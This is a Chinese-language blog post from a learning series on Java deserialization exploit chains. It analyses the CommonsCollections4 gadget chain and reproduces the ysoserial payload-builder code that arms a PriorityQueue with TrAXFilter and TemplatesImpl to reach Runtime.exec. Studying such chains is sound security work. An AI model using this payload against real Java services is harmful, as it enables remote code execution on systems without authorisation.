---
title: "Java反序列化利用链学习 - CommonCollection4"
date: 2022-05-02T17:21:00+08:00
lastmod: 2022-05-02T17:22:00+08:00
draft: false
lightgallery: true
categories: [
    "Java Security",
]
tags: [
    "deserialiaztion",
    "java",
    "common collection",
]
---
## Java反序列化利用链系列

* [Java反序列化利用链 - CommonCollection1](commoncollection1.md)
* [Java反序列化利用链 - CommonCollection2](commoncollection2.md)
* [Java反序列化利用链 - CommonCollection3](commoncollection3.md)
* [Java反序列化利用链 - CommonCollection4](commoncollection4.md)
* [Java反序列化利用链 - CommonCollection5](commoncollection5.md)
* [Java反序列化利用链 - CommonCollection6](commoncollection6.md)
* [Java反序列化利用链 - CommonCollection7](commoncollection7.md)

## Java反序列化利用链 - CommonCollection4

### 前置条件

* JDK 1.7
* commons-collections4 4.0

### 利用链分析

`CommonCollection4`为`CommonCollection2`的变种，不同的是将`org.apache.commons.collections.functors.InvokerTransformer`变为了`org.apache.commons.collections.functors.InstantiateTransformer`，并且通过`TrAXFilter`的构造函数来触发`TemplateImpl`利用链，这点在[Java反序列化利用链 - CommonCollection3]({{< relref "commoncollection3/index.md" >}})中已经提过了。

`CommonCollection4`利用链的调用过程大致如下：

```
Gadget chain:
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            ...
            PriorityQueue.siftDownUsingComparator()
                TransformingComparator.compare()
                    ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                            Method.invoke()
                                TrAXFilter.TrAXFilter()
                                    TemplatesImpl.newTransformer()
                                        TemplatesImpl.defineTransletClasses()
                                            Runtime.exec()
```

`ysoserial`中的相关代码如下

```java
public Queue<Object> getObject(final String command) throws Exception {
    Object templates = Gadgets.createTemplatesImpl(command);

    ConstantTransformer constant = new ConstantTransformer(String.class);

    // mock method name until armed
    Class[] paramTypes = new Class[] { String.class };
    Object[] args = new Object[] { "foo" };
    InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

    // grab defensively copied arrays
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

    ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

    // create queue with numbers
    PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
    queue.add(1);
    queue.add(1);

    // swap in values to arm
    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
    paramTypes[0] = Templates.class;
    args[0] = templates;

    return queue;
}
```

## References

1. <https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections4.java>
